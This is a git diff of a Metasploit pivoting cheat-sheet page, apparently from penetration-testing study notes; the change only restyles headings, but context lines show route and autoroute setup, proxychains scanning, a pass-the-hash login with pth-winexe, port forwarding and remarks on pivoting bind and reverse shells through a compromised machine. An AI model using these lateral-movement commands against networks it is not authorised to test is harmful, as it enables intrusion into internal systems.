@@ -1,6 +1,6 @@
 # ⭕ Metasploit Pivoting
 
-### MANUAL ROUTE
+### <mark style="color:orange;">MANUAL ROUTE</mark>
 
 this method will give the full access to the target IP address like its siting in our lan ( only accessible in metasploit )
 
@@ -9,7 +9,7 @@ background the session
 route add 10.0.1.0/24 [session id]
 ```
 
-### AUTO ROUTE
+### <mark style="color:orange;">AUTO ROUTE</mark>
 
 this method will give the full access to the target IP address like its siting in our lan ( only accessible in metasploit )
 
@@ -20,7 +20,7 @@ run autoroute -d -s 10.10.10.1  >>> delete autoroute on ip
 run autoroute -s 10.10.10.1/24 >>> can use CIDR
 ```
 
-### PROXY
+### <mark style="color:orange;">PROXY</mark>
 
 add a proxy to proxychains.conf and use it inside and outside of metasploit
 
@@ -44,7 +44,7 @@ proxychains nmap -Pn -sT -sV -p- [target]
 proxychains pth-winexe -U windows10/user123//10.0.1.5 cmd.exe
 ```
 
-### PORT FORWARD
+### <mark style="color:orange;">PORT FORWARD</mark>
 
 forward only the given remote port to the given local port specifically ( only accessible in msfconsole )
 
@@ -56,7 +56,7 @@ portfwd add -L 0.0.0.0 -l 8000 -p 80 -r 10.1.0.5
 
 now we can scan our local port 8000 to scan the remote port 80 of the target
 
-### PIVOTING BIND SHELL
+### <mark style="color:orange;">PIVOTING BIND SHELL</mark>
 
 usually used when exploiting a machine in the internal network. first we have to do port forwarding to scan the network
 
@@ -102,7 +102,7 @@ if we use a reverse shell the target machine on the internal network wont be abl
 
 ![](<../../.gitbook/assets/image (267).png>)
 
-### PIVOTING REVERSE SHELL
+### <mark style="color:orange;">PIVOTING REVERSE SHELL</mark>
 
 while using a reverse shell with pivoting we have to set the RHOST to target ip in the internal network and set the LHOST to the machine that we have already compromized
 
